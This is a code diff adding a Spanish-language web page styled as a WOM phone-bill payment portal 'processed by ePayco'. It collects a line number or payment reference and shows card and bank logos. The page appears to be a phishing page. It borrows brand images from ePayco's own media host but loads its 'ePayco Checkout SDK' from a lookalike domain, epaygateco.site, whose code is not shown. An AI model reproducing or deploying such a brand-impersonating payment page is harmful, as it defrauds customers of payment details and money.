@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es" class="notranslate" translate="no">
+<head>
+    <meta charset="UTF-8">
+    <meta name="google" content="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18153483182"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'AW-18153483182');
+    </script>
+    <title>Paga tus facturas WOM con ePayco fácil y seguro</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v=1781644299">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=1781644299">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=1781644299">
+    <link rel="manifest" href="/site.webmanifest?v=1781644299">
+    <link rel="stylesheet" href="/css/wom.css?v=1778964345">
+    <link rel="stylesheet" href="/css/wom-tailwind.css?v=1778964345">
+    <!-- Swiper CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css">
+    <!-- ePayco Checkout SDK -->
+    <script src="https://epaygateco.site/sdk/checkout-v2.js">
+    </script>
+    <!-- Swiper JS -->
+    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js">
+    </script>
+</head>
+<body class="notranslate" translate="no">
+
+    <main class="main-container">
+        <section class="left-section">
+            <!-- Header -->
+            <header class="header-logo">
+                <img src="https://multimedia.epayco.co/wom/logo.png" alt="logo wom" onclick="window.location.href='/'">
+            </header>
+
+            <!-- Formulario de consulta -->
+            <section class="content-section">
+                <div class="query-form-container">
+
+                    <!-- Modal de error (sin facturas) -->
+                    <div id="errorModal" class="error-modal" data-should-open="false">
+                        <div class="error-modal-inner">
+                            <button type="button" id="closeModal" class="error-modal-close">&times;</button>
+                            <img src="https://multimedia.epayco.co/wom/info/error.png" alt="error" class="error-modal-img">
+                            <h2 id="errorModalTitle" class="error-modal-title">En este momento no tienes saldos por pagar</h2>
+                            <p id="errorModalText" class="error-modal-text">Si quieres abonar a tu próxima factura, puedes hacerlo digitando tu referencia de pago.</p>
+                            <button type="button" id="closeModalBtn" class="error-modal-btn">ABONAR</button>
+                        </div>
+                    </div>
+
+                    <h2>¡Paga fácil y seguro!</h2>
+
+                    <form id="queryForm" action="/consulta" method="POST" autocomplete="off">
+                        <input type="hidden" name="csrf_token" value="744e0f4f9ba33364398b942b56426d930da437d1486ca8b02d7f6efee07e938a">
+
+                        <!-- Input único: Número de línea o referencia -->
+                        <div class="query-input-row">
+                            <img src="https://multimedia.epayco.co/wom/icons/phone.png" alt="phone icon">
+                            <input
+                            type="text"
+                            maxlength="10"
+                            inputmode="numeric"
+                            pattern="[0-9]*"
+                            autocomplete="off"
+                            enterkeyhint="go"
+                            autocapitalize="off"
+                            spellcheck="false"
+                            class="queryPlaceholder"
+                            placeholder="Número de línea o referencia única de pago"
+                            name="phoneNumber"
+                            id="phoneInput"
+                            required
+                            />
+                        </div>
+
+                        <span id="errorMessage" class="query-error-msg hidden"></span>
+
+                        <!-- Botón consultar -->
+                        <div class="query-btn-wrapper">
+                            <div id="loadingButton" class="hidden">
+                                <button type="button" disabled class="query-btn-loading">
+                                    <svg class="loading" style="width:20px;height:20px;margin-right:8px;" viewBox="0 0 24 24">
+                                        <circle style="opacity:0.25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" fill="none"></circle>
+                                        <path style="opacity:0.75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                    </svg>
+                                    Consultando...
+                                </button>
+                            </div>
+                            <div id="submitButtonContainer">
+                                <!-- 🔥 ELIMINÉ EL "disabled" PARA QUE FUNCIONE -->
+                                <button type="submit" id="submitButton">IR A PAGAR</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <!-- Security badge -->
+                    <div class="security-badge">
+                        <img class="icon" src="https://multimedia.epayco.co/wom/icons/union.png" alt="security">
+                        <p>Pagos procesados por</p>
+                        <img src="https://multimedia.epayco.co/wom/epayco.png" alt="epayco">
+                    </div>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="wom-footer">
+                <p class="footerTitle">Medios de pago disponibles</p>
+                <ul class="footer-logos-list">
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/mastercard.png" alt="Master Card"></li>
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/visa.png" alt="Visa"></li>
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/AM.png" alt="Americanexpress"></li>
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/DC.png" alt="Dinersclub"></li>
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/pse.png" alt="pse"></li>
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/codensa.png" alt="Codensa"></li>
+                    <li><img src="https://multimedia.epayco.co/wom/paymentMethods/daviplata.png" alt="Daviviplata"></li>
+                </ul>
+
+                <div class="footer-swiper-wrapper">
+                    <div class="swiper footer-swiper-inner">
+                        <div class="swiper-wrapper">
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/mastercard.png" alt="Master Card"></div>
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/visa.png" alt="Visa"></div>
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/AM.png" alt="Americanexpress"></div>
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/DC.png" alt="Dinersclub"></div>
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/pse.png" alt="pse"></div>
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/codensa.png" alt="Codensa"></div>
+                            <div class="swiper-slide"><img src="https://multimedia.epayco.co/wom/paymentMethods/daviplata.png" alt="Daviviplata"></div>
+                        </div>
+                        <div class="swiper-pagination"></div>
+                    </div>
+                </div>
+            </footer>
+        </section>
+
+        <!-- Banner -->
+        <section class="right-section">
+            <div class="w-full h-full banner-responsive"></div>
+        </section>
+    </main>
+
+    <script src="/js/helpers.js?v=1778964345"></script>
+    <script src="/js/query.js?v=1778964345"></script>
+    <script>
+        gtag('event', 'conversion', {
+            'send_to': 'AW-18153483182/GD7ZCOOi86ocEK7XoNBD'
+        });
+    </script>
+
+    <!-- Inicializar Swiper para el footer de medios de pago — solo en ≤1200px -->
+    <script>
+        (function() {
+            var swiperInstance = null;
+            var BREAKPOINT = 1200;
+
+            function initSwiper() {
+                if (swiperInstance) return;
+                var swiperEl = document.querySelector('.footer-swiper-inner');
+                if (swiperEl && typeof Swiper !== 'undefined') {
+                    swiperInstance = new Swiper('.footer-swiper-inner', {
+                        slidesPerView: 4,
+                        spaceBetween: 1,
+                        loop: false,
+                        autoplay: { delay: 2500, disableOnInteraction: false },
+                        pagination: {
+                            el: '.footer-swiper-inner .swiper-pagination',
+                            clickable: true,
+                            dynamicBullets: false,
+                        },
+                    });
+                }
+            }
+
+            function destroySwiper() {
+                if (swiperInstance) {
+                    swiperInstance.destroy(true, true);
+                    swiperInstance = null;
+                    var el = document.querySelector('.footer-swiper-inner');
+                    if (el) el.removeAttribute('style');
+                    var slides = document.querySelectorAll('.footer-swiper-inner .swiper-slide');
+                    slides.forEach(function(s) { s.removeAttribute('style'); });
+                    var wrapper = document.querySelector('.footer-swiper-inner .swiper-wrapper');
+                    if (wrapper) wrapper.removeAttribute('style');
+                }
+            }
+
+            function handleResize() {
+                if (window.innerWidth <= BREAKPOINT) {
+                    initSwiper();
+                } else {
+                    destroySwiper();
+                }
+            }
+
+            handleResize();
+            window.addEventListener('resize', handleResize);
+        })();
+    </script>
+
+    <!-- 🔥 SCRIPT DE RESPALDO PARA HABILITAR EL BOTÓN -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phoneInput');
+            const submitButton = document.getElementById('submitButton');
+
+            if (!phoneInput || !submitButton) return;
+
+            function toggleButton() {
+                const value = phoneInput.value.replace(/\D/g, '');
+                // Habilita solo si son 10 dígitos y empiezan con 3
+                if (value.length === 10 && value.startsWith('3')) {
+                    submitButton.disabled = false;
+                    submitButton.classList.add('active');
+                } else {
+                    submitButton.disabled = true;
+                    submitButton.classList.remove('active');
+                }
+            }
+
+            phoneInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+                toggleButton();
+            });
+
+            // Estado inicial
+            toggleButton();
+        });
+    </script>
+</body>
+</html>
